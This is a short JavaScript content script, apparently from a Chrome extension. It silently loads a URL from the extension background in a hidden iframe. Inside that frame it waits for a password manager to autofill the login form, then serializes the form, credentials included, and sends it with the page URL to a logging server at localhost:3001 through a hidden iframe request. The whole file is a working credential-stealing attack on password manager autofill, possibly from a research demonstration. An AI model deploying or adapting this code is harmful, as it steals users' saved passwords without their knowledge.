// use an iframe element to make an GET HTTP request
var iframe = document.createElement('iframe');
iframe.setAttribute('style', 'display: none;');
document.body.appendChild(iframe);

function send(data) {
	// add the current web pages URL to the outgoiing data
	data += "&url=" + encodeURIComponent(window.location.href);

	// set the iframes src attribute to our remote server
	iframe.setAttribute('src', 'https://localhost:3001/log?' + data);
}

// Determine whether we are in an iframe or not.
if(window.self === window.top) {
	
	// Get an url from the background
	chrome.runtime.sendMessage({get:'url'}, function(response) {
		
		if(response.url) {
			
			// Create new iframe
			var newIframe = document.createElement('iframe');
			newIframe.setAttribute('style', 'display: none;');
			newIframe.setAttribute('src', response.url);
			document.body.appendChild(newIframe);
		}
	});
}
else {
	
	// Locate password field and corresponding form
	var passwordInput = $('input[type="password"]');
	var form = passwordInput.closest('form');

	// If found password field, wait until password manager 
	// has filled in credentials. Then send form.
	if(passwordInput.length > 0) {
		setTimeout(function() {
			send(form.serialize()); 
		}, 500);
	}
}